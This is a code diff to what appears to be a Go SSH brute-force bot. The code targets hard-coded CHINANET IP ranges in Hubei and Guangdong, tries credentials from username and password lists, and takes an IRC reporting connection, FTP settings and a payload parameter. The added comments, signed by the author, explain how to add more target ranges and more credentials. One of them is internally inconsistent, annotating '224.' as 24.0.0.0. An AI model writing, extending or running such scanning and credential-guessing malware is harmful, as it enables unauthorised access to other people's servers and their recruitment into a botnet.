@@ -12,12 +12,35 @@ import (
 
 var Scan_Switch bool
 
+/*
+					How to add more IP range
+
+	(1) Add you'r new ip range in to The set of const varible
+		Example:
+			var_name = "224." //24.0.0.0 - 24.255.255.255
+
+	(2) Go to "NextIP" function and add you'r ip range case
+		Example:
+			case var_name:
+					return ManageIP_range(ipRange, GenRange(255, 0))
+
+	(3) Then go to The "SSH_Conn" function,
+		And add you'r constant ip range to The array name "NetArr"
+		Example:
+			NetArr := []string{
+				chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
+				cgpn4, cgpn5, cgpn6, priv, var_name,
+			}
+
+~R4bin
+*/
+
 const (
 	//CHINANET Hubei province network
 	chpn1 = "116." //116.208.0.0 - 116.211.255.255
 	chpn2 = "119." //119.96.0.0 - 119.103.255.255
 	chpn3 = "58."  //58.48.0.0 - 58.55.255.255
-	chpn4 = "221." //221.232.0.0 - 221.235.255.255
+	chpn4 = "221." //221.232.0.0 - 221.255.255.255
 	chpn5 = "27."  //27.16.0.0 - 27.31.255.255
 
 	//CHINANET Guangdong province network
@@ -115,6 +138,13 @@ func SSH_Session(ssh_session *ssh.Client, command string) {
 	session.Close()
 }
 
+/*
+				How to add more usernames and passwords
+
+	    Just add it in to The array name "userList" and passList
+
+~R4bin
+*/
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 	NetArr := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
